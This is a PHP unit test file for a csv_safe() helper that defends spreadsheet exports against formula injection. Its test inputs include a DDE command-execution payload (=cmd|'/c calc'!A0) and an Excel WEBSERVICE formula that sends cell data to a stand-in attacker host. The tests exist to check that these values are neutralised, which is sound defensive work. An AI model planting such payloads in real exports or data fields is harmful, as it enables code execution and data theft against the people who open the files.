<?php

declare(strict_types=1);

namespace Tests\Unit\Security;

use Tests\TestCase;

/**
 * Regression tests for the global `csv_safe()` helper.
 *
 * Background: 9 export controllers feed user-controlled fields (vendor
 * names, descriptions, patient names) into CSV / XLSX rows. Excel and
 * LibreOffice both treat a cell whose first character is `=`, `+`, `-`,
 * `@`, tab, or carriage return as a formula expression — an attacker who
 * stores `=cmd|'/c calc'!A0` in a vendor name lands a remote code
 * execution every time someone opens the export.
 *
 * `csv_safe()` is the chokepoint that defangs those values by prepending
 * a single quote. If any of these tests start failing, every export site
 * regresses to formula-injection-vulnerable.
 */
class CsvSafeTest extends TestCase
{
    public function test_plain_string_passes_unchanged(): void
    {
        $this->assertSame('hello', csv_safe('hello'));
        $this->assertSame('Acme Corp', csv_safe('Acme Corp'));
    }

    public function test_empty_string_passes_unchanged(): void
    {
        // Defang only triggers on the FIRST character, so an empty
        // string can never be a formula — return as-is.
        $this->assertSame('', csv_safe(''));
    }

    public function test_number_passes_unchanged(): void
    {
        // Numbers are not strings; defang must not coerce them — Excel
        // would lose its number formatting otherwise.
        $this->assertSame(42, csv_safe(42));
        $this->assertSame(3.14, csv_safe(3.14));
        $this->assertSame(0, csv_safe(0));
    }

    public function test_null_passes_unchanged(): void
    {
        $this->assertNull(csv_safe(null));
    }

    public function test_equals_prefix_is_defanged(): void
    {
        // Classic CSV injection: `=1+2` evaluates to 3 in Excel.
        $this->assertSame("'=1+2", csv_safe('=1+2'));
    }

    public function test_dde_payload_is_defanged(): void
    {
        // Real-world attack: DDE-style command execution via the
        // |'<cmd>'! formula syntax.
        $payload = '=cmd|\'/c calc\'!A0';
        $result = csv_safe($payload);
        $this->assertSame("'" . $payload, $result);
    }

    public function test_webservice_exfil_is_defanged(): void
    {
        // Excel WEBSERVICE() formula leaks data to attacker URL.
        $payload = '=WEBSERVICE("https://attacker.tld/?p="&A1)';
        $this->assertSame("'" . $payload, csv_safe($payload));
    }

    public function test_plus_prefix_is_defanged(): void
    {
        // `+1+2` is also evaluated as a formula in Excel.
        $this->assertSame("'+1+2", csv_safe('+1+2'));
    }

    public function test_minus_prefix_is_defanged(): void
    {
        $this->assertSame("'-1-2", csv_safe('-1-2'));
    }

    public function test_at_prefix_is_defanged(): void
    {
        // `@SUM(...)` is the Lotus 1-2-3 / older Excel formula syntax,
        // still honoured by some readers.
        $this->assertSame("'@SUM(A1:A10)", csv_safe('@SUM(A1:A10)'));
    }

    public function test_tab_prefix_is_defanged(): void
    {
        // Excel strips leading whitespace before evaluating, so
        // \t=cmd... becomes =cmd... — defang.
        $payload = "\t=cmd|'/c calc'!A0";
        $this->assertSame("'" . $payload, csv_safe($payload));
    }

    public function test_carriage_return_prefix_is_defanged(): void
    {
        $payload = "\r=1+1";
        $this->assertSame("'" . $payload, csv_safe($payload));
    }

    public function test_minus_in_negative_number_string_is_defanged(): void
    {
        // Even legitimate negative numbers in string form get prefixed.
        // The CSV cell will display `-100` because Excel renders the
        // single quote as invisible — no data loss, just safe.
        $this->assertSame("'-100", csv_safe('-100'));
    }

    public function test_innocent_email_with_at_is_only_defanged_at_start(): void
    {
        // `john@example.com` has `@` but not at position 0 — must pass.
        $this->assertSame('john@example.com', csv_safe('john@example.com'));
    }

    public function test_inner_equals_is_not_defanged(): void
    {
        // `1+1=2` is a string, the `=` is not at position 0.
        $this->assertSame('1+1=2', csv_safe('1+1=2'));
    }

    public function test_fputcsv_safe_runs_every_cell_through_filter(): void
    {
        // Round-trip via fputcsv_safe: cells starting with formula
        // triggers must be quoted; safe cells must round-trip clean.
        $tmp = fopen('php://memory', 'w+');
        fputcsv_safe($tmp, ['Acme Corp', '=cmd|"/c calc"!A0', 1234, '@SUM(A1)', 'plain']);

        rewind($tmp);
        $written = stream_get_contents($tmp);
        fclose($tmp);

        $this->assertStringContainsString("Acme Corp", $written);
        $this->assertStringContainsString("'=cmd", $written);
        $this->assertStringContainsString('1234', $written);
        $this->assertStringContainsString("'@SUM(A1)", $written);
        $this->assertStringContainsString('plain', $written);
        // The dangerous cells must NOT appear without the leading quote.
        $this->assertStringNotContainsString(',=cmd', $written);
        $this->assertStringNotContainsString(',@SUM', $written);
    }
}
